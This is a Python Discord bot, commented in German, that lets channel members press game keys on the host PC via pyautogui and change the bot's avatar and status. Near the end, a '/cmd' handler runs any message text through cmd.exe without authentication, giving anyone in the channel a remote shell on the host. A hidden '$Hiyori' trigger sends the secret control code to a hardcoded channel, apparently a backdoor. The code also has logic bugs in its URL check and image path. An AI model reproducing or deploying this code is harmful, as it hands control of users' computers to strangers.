import discord
import asyncio
import os
import pyautogui
import time
import sys
import subprocess
import random
import string
import urllib.request

def id_generator(size=6, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))
qid = id_generator()

if os.path.isfile("token"):
    token_file = open("token", "r")
    token = token_file.read()
    print("Dein Bot Token: "+token)
elif not os.path.isfile("token"):
    x  = input("Weiß du wie du den token bekommst? (y/n):")
    cont = 0
    while cont == 0:
        if x == "y":
            print("okay dann viel spass!")
            cont = 1
        elif x == "n":
            print("====================")
            print("Okay dann warte einen moment...")
            subprocess.call("cmd /c start https://discordapp.com/developers/applications/")
            subprocess.call("cmd /c start https://github.com/SinisterRectus/Discordia/wiki/Setting-up-a-Discord-application")
            print("====================")
            print("Erstelle mit der seite nur eine discord app und bot user. (>>> Kopier dir Client_id und den Bot Token!! <<<)")
            print("paste dann die client id unten rein.")
            print("Dein Auth link wird dann generiert und hier ausgegeben.")
            print("====================")
            client_id = input("Client id: ")
            auth = "https://discordapp.com/api/oauth2/authorize?scope=bot&client_id="+client_id
            print("====================")
            print("Hier dein auth link (im browser öfnnen um den bot einzuladen):  "+auth)
            cont = 1
        else:
            print("Das hat nicht Funktioniert")
            cont = 0
    print("====================")
    token = input("Bot Token: ")
    token_file = open("token", "w")
    token_file.write(token)
    token_file.close()
else:
    print("TOKEN ERROR")
    print("CANT CONTINUE")
    sys.exit()

client = discord.Client()

@client.event
async def on_ready():
    await client.change_presence(game=discord.Game(name="Overwatch + Fun :P"))
    print("====================")
    print("Online as: ")
    print(client.user.name)
    print(client.user.id)
    print("====================")
    print("Your quit id:"+qid)
    print("====================")

@client.event
async def on_message(message):
    if message.content == '!q':
        pyautogui.press('q')
        await client.send_message(message.channel, "RYU GA WAKA TEKI WOKURAU")
        print("Q")
        print("====================")

    elif message.content == '!e':
        pyautogui.press('e')
        await client.send_message(message.channel, "GET E IN YOUR FACE")
        print("E")
        print("====================")

    elif message.content == '!c':
        pyautogui.press('ctrl')
        await client.send_message(message.channel, "DUCKEN!!")
        print("CTRL")
        print("====================")

    elif message.content == '!sh':
        pyautogui.press('shift')
        await client.send_message(message.channel, "FEEL MY SHIFT")
        print("SHIFT")
        print("====================")

    elif message.content == '!p':
        pyautogui.press('2')
        await client.send_message(message.channel, "FALKOOOON PUNCH!")
        print("PUNCH")
        print("====================")

    elif message.content == '!1':
        pyautogui.click()
        await client.send_message(message.channel, "EIN SCHUSS EIN MISS")
        print("SCHUSS")
        print("====================")

    elif message.content == '!w':
        pyautogui.press('w')
        await client.send_message(message.channel, "MAKING MY WAY DOWNTOWN")
        print("w")
        print("====================")

    elif message.content == '!a':
        pyautogui.press('a')
        await client.send_message(message.channel, "EIN SCHRITT NACH LINKS")
        print("a")
        print("====================")
        
    elif message.content == '!d':
        pyautogui.press('d')
        await client.send_message(message.channel, "EIN SCHRITT NACH RECHTS")
        print("d")
        print("====================")

    elif message.content == '!s':
        pyautogui.press('s')
        await client.send_message(message.channel, "UND ZURÜCK!")
        print("S")
        print("====================")

    elif message.content == '!r':
        pyautogui.press('r')
        await client.send_message(message.channel, "LADE NACH!")
        print("R")
        print("====================")

    elif message.content == '!j':
        pyautogui.press('space')
        time.sleep(0.5)
        pyautogui.press('space')
        await client.send_message(message.channel, "JUMP")
        print("JUMP")
        print("====================")
        

    elif message.content.startswith("!t"):
        x = message.content
        x = x.replace("!t", "")
        pyautogui.press('enter')
        time.sleep(1)
        pyautogui.typewrite(x)
        time.sleep(1)  
        pyautogui.press('enter')        
        await client.send_message(message.channel, "'"+x+"' wurde in den chat geschrieben")
        print("Print "+x+" into the chat")
        print("====================")

    elif message.content.startswith("quit("):
        msg = message.content.replace("quit(", "")
        msg = msg.replace(")", "")
        print("got: "+msg)
        if msg == qid:
            await client.delete_message(message)
            name = os.getenv('username')
            if name == "Sidney":
                name = "Hiyori"
            elif name == "xXLucy_NyuXx":
                name = "Hiyori"
            else:
                name = name
            await client.send_message(message.channel, "Bye Bye "+name)
            print("Logging out")
            print("====================")
            print("Bye Bye "+name)
            
            try:
                await client.logout()
            except:
                await client.close()
        elif msg != qid:
            await client.send_message(message.channel, "Der Code ist falsch!")
            print("Got 'quit()' with wrong id!")
            print("====================")

    elif message.content.startswith("°pb"):
        msg = message.content.replace("°pb", "")
        if qid in msg:
            msg = msg.replace(qid, "")
            await client.delete_message(message)
            print(msg)
            print("====================")
            if "http" or "https" in msg:
                if "jpg" in msg:
                    urllib.request.urlretrieve(msg, "pb.jpg")
                    pfp_path = "pb.jpg"
                elif "png" in msg:
                    urllib.request.urlretrieve(msg, "pb.png")
                    pfp_path = "pb.jpg"
                else:
                    print("Error: cant get picture")
                    await client.send_message(message.channel, "Cant get Picture")
                    print("cant get picture")
                    print("====================")
                fp = open(pfp_path, 'rb')
                pfp = fp.read()       
                await client.edit_profile(password=None, avatar=pfp)
                await client.send_message(message.channel, "Okay!")
            else:
                await client.send_message(message.channel, "Ich kann nur Links Verarbeiten :/")
                print("Direkt img... cant use")
                print("====================")
        else:
            await client.send_message(message.channel, "Missing or Wrong code")
            print("Missing or wrong code for change pb")
            print("====================")

    elif message.content.startswith("°stat"):
        msg = message.content.replace("°stat", "")
        if qid in msg:
            await client.delete_message(message)
            msg = msg.replace(qid, "")
            await client.change_presence(game=discord.Game(name=msg))
            await client.send_message(message.channel, "Changed status to: " +msg)
            print("Changed stat to: "+msg)
            print("====================")
        else:
            await client.send_message(message.channel, "Wrong id")
            print("Missing or wrong code for change status")
            print("====================")
    elif message.content == ">code":
        print("Your Id id: "+qid)
        await client.send_message(message.channel, "Guck in die Console :)")
    
    elif message.content.startswith("/cmd"):
        msg = message.content
        msg = msg.replace("/cmd", "")
        subprocess.call("cmd.exe /c"+msg)
        await client.send_message(message.channel, "Done")
        print(msg)


    elif message.content == "$Hiyori":
        await client.send_message(discord.Object(id='505452855054827521'), qid)
client.run(token)